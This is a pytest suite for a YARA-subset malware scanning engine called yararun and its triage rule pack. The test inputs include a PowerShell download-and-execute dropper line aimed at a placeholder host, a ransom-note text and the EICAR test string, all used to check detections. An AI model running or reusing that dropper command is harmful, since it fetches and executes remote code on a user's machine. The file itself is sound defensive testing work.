"""Deep tests for the YARARUN YARA-subset engine and triage rule pack."""
import json
import os
import sys

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

from yararun import (  # noqa: E402
    TOOL_NAME,
    TOOL_VERSION,
    load_rules,
    parse_rules,
    scan,
)
from yararun.cli import main  # noqa: E402

DEMO = os.path.join(ROOT, "demos", "02-deep")


# --------------------------------------------------------------------------- #
# Metadata                                                                     #
# --------------------------------------------------------------------------- #
def test_tool_identity():
    assert TOOL_NAME == "yararun"
    assert TOOL_VERSION.count(".") == 2


def test_bundled_pack_parses():
    rules = load_rules()
    assert len(rules) >= 12
    names = {r.name for r in rules}
    assert {"PE_Executable", "Ransom_Note", "UPX_Packed",
            "Embedded_PowerShell"} <= names


# --------------------------------------------------------------------------- #
# String kinds                                                                 #
# --------------------------------------------------------------------------- #
def test_text_string_nocase_and_fullword():
    src = '''
    rule T {
        strings:
            $a = "Malware" nocase
            $b = "IEX" fullword
        condition:
            $a and $b
    }'''
    r = parse_rules(src)[0]
    # nocase matches, fullword requires word boundaries
    assert scan(b"this is malware; IEX runs", [r]).matches
    assert not scan(b"this is malware; IEXtra", [r]).matches  # $b not fullword


def test_hex_string_wildcards_and_jumps():
    src = '''
    rule H {
        strings:
            $h = { 4D 5A ?? ?? [4-8] 50 45 00 00 }
        condition:
            $h
    }'''
    r = parse_rules(src)[0]
    good = b"MZ\x90\x00" + b"\x00" * 6 + b"PE\x00\x00"
    assert scan(good, [r]).matches
    too_short = b"MZ\x90\x00" + b"\x00" * 2 + b"PE\x00\x00"  # gap < 4
    assert not scan(too_short, [r]).matches


def test_regex_string_and_count():
    src = r'''
    rule R {
        strings:
            $u = /https?:\/\/[a-z]+/ nocase
        condition:
            #u >= 2
    }'''
    r = parse_rules(src)[0]
    assert not scan(b"one http://aaa here", [r]).matches
    assert scan(b"http://aaa and HTTPS://bbb", [r]).matches


# --------------------------------------------------------------------------- #
# Condition operators                                                          #
# --------------------------------------------------------------------------- #
def test_at_and_filesize_conditions():
    src = '''
    rule A {
        strings:
            $mz = { 4D 5A }
        condition:
            $mz at 0 and filesize < 1KB
    }'''
    r = parse_rules(src)[0]
    assert scan(b"MZ payload", [r]).matches
    assert not scan(b"xxMZ payload", [r]).matches  # not at offset 0


def test_n_of_set_and_them():
    src = '''
    rule N {
        strings:
            $s1 = "alpha"
            $s2 = "bravo"
            $s3 = "charlie"
        condition:
            2 of them
    }'''
    r = parse_rules(src)[0]
    assert not scan(b"only alpha", [r]).matches
    assert scan(b"alpha and bravo", [r]).matches
    assert scan(b"alpha bravo charlie", [r]).matches


def test_wildcard_set_prefix():
    src = '''
    rule W {
        strings:
            $a1 = "foo"
            $a2 = "bar"
            $b1 = "baz"
        condition:
            any of ($a*)
    }'''
    r = parse_rules(src)[0]
    assert scan(b"contains foo", [r]).matches
    assert not scan(b"contains baz only", [r]).matches


# --------------------------------------------------------------------------- #
# Real triage detections against the bundled pack                              #
# --------------------------------------------------------------------------- #
def test_eicar_detection():
    eicar = (rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-"
             rb"ANTIVIRUS-TEST-FILE!$H+H*")
    res = scan(eicar, load_rules())
    assert any(m.rule == "EICAR_Test_File" for m in res.matches)


def test_ransom_note_detection_critical():
    note = (b"All your files have been encrypted! To decrypt them you must "
            b"send 0.5 bitcoin to our BTC wallet. Pay the ransom now.")
    res = scan(note, load_rules())
    rn = [m for m in res.matches if m.rule == "Ransom_Note"]
    assert rn and rn[0].severity == "critical"
    assert res.max_severity == "critical"


def test_powershell_dropper_detection():
    blob = (b"powershell -enc IEX (New-Object Net.WebClient)."
            b"DownloadString('http://x'); FromBase64String")
    res = scan(blob, load_rules())
    assert any(m.rule == "Embedded_PowerShell" for m in res.matches)


# --------------------------------------------------------------------------- #
# Demo fixtures + CLI                                                          #
# --------------------------------------------------------------------------- #
def test_demo_sample_scans_dirty():
    sample = os.path.join(DEMO, "suspicious_sample.bin")
    ruls = os.path.join(DEMO, "triage.yar")
    assert os.path.exists(sample) and os.path.exists(ruls)
    with open(sample, "rb") as fh:
        data = fh.read()
    with open(ruls, "r", encoding="utf-8") as fh:
        rules = parse_rules(fh.read())
    res = scan(data, rules, target=sample)
    hit = {m.rule for m in res.matches}
    assert "Dropper_PowerShell_Chain" in hit
    assert "Embedded_PE_via_HexHeader" in hit
    assert "C2_Beacon_URL" in hit


def test_cli_scan_returns_nonzero_on_findings(capsys):
    sample = os.path.join(DEMO, "suspicious_sample.bin")
    ruls = os.path.join(DEMO, "triage.yar")
    rc = main(["--format", "json", "scan", "-r", ruls, sample])
    out = capsys.readouterr().out
    payload = json.loads(out)
    assert rc == 1                      # actionable findings -> non-zero exit
    assert payload["match_count"] >= 3
    assert payload["max_severity"] in ("high", "critical")


def test_cli_scan_clean_returns_zero(tmp_path, capsys):
    clean = tmp_path / "clean.txt"
    clean.write_text("just some perfectly ordinary text\n")
    rc = main(["scan", str(clean)])
    capsys.readouterr()
    assert rc == 0


def test_cli_compile_and_rules(capsys):
    ruls = os.path.join(DEMO, "triage.yar")
    rc = main(["compile", ruls])
    assert rc == 0
    capsys.readouterr()
    rc = main(["--format", "json", "rules"])
    out = capsys.readouterr().out
    assert rc == 0
    data = json.loads(out)
    assert any(r["name"] == "Cryptominer_Config" for r in data)


def test_version(capsys):
    with pytest.raises(SystemExit) as e:
        main(["--version"])
    assert e.value.code == 0
    assert TOOL_VERSION in capsys.readouterr().out
